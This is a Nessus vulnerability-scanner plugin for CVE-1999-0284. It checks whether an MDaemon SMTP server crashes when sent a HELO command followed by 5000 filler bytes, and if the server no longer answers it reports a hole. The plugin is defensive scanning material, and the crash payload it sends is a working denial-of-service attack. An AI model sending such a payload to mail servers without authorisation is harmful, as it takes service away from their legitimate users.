#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10136);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-1999-0284");
 script_bugtraq_id(8555, 8621, 8622);
 script_xref(name:"OSVDB", value:"6117");

 script_name(english:"MDaemon SMTP HELO Command Remote Overflow DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote mail server may be affected by a buffer overflow
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote SMTP server by sending a too long
argument to the HELO command.  This allows an unauthenticated remote
attacker to deny service to legitimate users of the server. 

It may also indicate the service is affected by a buffer overflow
vulnerability which, if true, would allow an attacker to execute
arbitrary code on the affected host, subject to the privileges under
which the service operates." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/1998_1/0374.html" );
 script_set_attribute(attribute:"solution", value:
"Contact the vendor for a fix." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
 script_summary(english:"Crashes the remote MTA");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"SMTP problems");
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  d = smtp_recv_banner(socket:soc);
  s = string("HELO ", crap(5000), "\r\n");
  send(socket:soc, data:s);
  close(soc);
  
  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
  else close(soc2);
 }
}
